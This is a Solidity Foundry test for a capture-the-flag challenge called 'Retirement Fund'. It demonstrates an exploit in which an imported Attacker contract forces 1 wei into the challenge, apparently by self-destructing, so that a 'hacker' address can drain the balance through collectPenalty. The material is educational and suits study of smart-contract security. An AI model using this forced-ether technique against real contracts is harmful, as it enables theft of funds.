// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./RetirementFundChallenge.sol";
import "./Attacker.sol";

contract RetirementFundChallengeTest is Test {
    RetirementFundChallenge public retirementFundChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        retirementFundChallenge = new RetirementFundChallenge{value: 1 ether}(hacker);
    }

    // without fallback/recieve function, it reverts;
    function testRetirementFund1() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("retirementFundChallenge's balance", address(retirementFundChallenge).balance);

        vm.startPrank(hacker);
        vm.expectRevert();
        payable(address(retirementFundChallenge)).transfer(1 wei);

        emit log_named_uint(
            "after transfer, retirementFundChallenge's balance", address(retirementFundChallenge).balance
        );

        vm.expectRevert();
        retirementFundChallenge.collectPenalty();
        vm.stopPrank();

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint("retirementFundChallenge's new balance", address(retirementFundChallenge).balance);

        assertFalse(retirementFundChallenge.isComplete());
    }

    function testRetirementFund2() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("retirementFundChallenge's balance", address(retirementFundChallenge).balance);

        vm.startPrank(hacker);
        new Attacker{value: 1 wei}(payable(address(retirementFundChallenge)));

        emit log_named_uint(
            "after selfdestruct to, retirementFundChallenge's balance", address(retirementFundChallenge).balance
        );

        retirementFundChallenge.collectPenalty();
        vm.stopPrank();

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint("retirementFundChallenge's new balance", address(retirementFundChallenge).balance);

        assertTrue(retirementFundChallenge.isComplete());
    }
}
